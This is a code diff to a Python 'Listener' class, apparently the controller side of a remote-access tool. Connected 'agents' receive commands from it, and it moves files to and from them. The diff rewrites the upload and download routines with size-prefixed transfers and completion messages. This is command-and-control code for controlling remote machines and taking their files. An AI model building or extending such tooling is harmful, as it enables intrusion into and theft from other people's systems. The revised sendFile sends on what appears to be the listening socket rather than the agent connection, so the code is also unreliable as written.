@@ -7,7 +7,7 @@ import json
 class Listener:
     # CONSTRUCTOR METHOD =====
     def __init__(self, ip, port):
-        self.localSocket  = socket.socket()
+        self.localSocket  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.bufferSize   = 1024
         self.operatingSys = ""
 
@@ -43,16 +43,15 @@ class Listener:
 
     # SEND FILE =====
     def sendFile(self, file_path):
-        file     = open(file_path, "rb")
-        fileSize = os.path.getsize(file_path)
+        file    = open(file_path, "rb")
+        data    = file.read()
+        dataLen = len(data)
 
-        self.agentSocket.send(str(fileSize).encode())
+        self.localSocket.send(str(dataLen).encode())
+        self.localSocket.sendall(data)
 
-        data = file.read()
-        self.agentSocket.sendall(data)
-
-        file.close()
-        print("[+] Listener: File transfer complete")
+        completeMsg = self.localSocket.recv(self.bufferSize)
+        if (completeMsg): file.close()
     # END OF sendFile METHOD
 
     # RECEIVE FILE =====
@@ -65,22 +64,26 @@ class Listener:
             elif (self.operatingSys == "Unix")   : destination = filePath.split("/")[-1]
         elif (len(cmd_list) == 3): destination = cmd_list[-1]
 
-        fileSize   = self.agentSocket.recv(self.bufferSize).decode()
-        file       = open(destination, "wb")
-        fileBytes  = b""
-        remainSize = int(fileSize)
+        dataSize  = int(self.agentSocket.recv(self.bufferSize).decode())
+        file      = open(destination, "wb")
+        fileBytes = b""
+        buffer    = 1000
         
-        while (0 < remainSize):
-            if (self.bufferSize <= remainSize):
-                fileBytes += self.agentSocket.recv(self.bufferSize)
-                remainSize -= self.bufferSize
-            elif (remainSize < self.bufferSize):
-                fileBytes  += self.agentSocket.recv(remainSize)
-                remainSize -= remainSize
+        while (len(fileBytes) < dataSize):
+            curBytes    = len(fileBytes)
+            remainBytes = dataSize - curBytes
+
+            if   (buffer <= remainBytes): fileBytes += self.agentSocket.recv(buffer)
+            elif (remainBytes < buffer):  fileBytes += self.agentSocket.recv(remainBytes)
         
         file.write(fileBytes)
         file.close()
+
+        self.agentSocket.send(b"Download completed")
+        print(f"Downloaded {len(fileBytes)} bytes of data")
         print(f"[+] Listener: File successfully saved to {destination}")
+
+        return
     # END OF recvFile METHOD
 
     # EXECUTE =====
@@ -121,6 +124,8 @@ class Listener:
                         filePath = cmdList[1]
 
                         self.sendFile(filePath)
+                        print("[+] Listener: File transfer complete\n")
+
                         commandResult = self.recvData()
                         print(commandResult)
                     
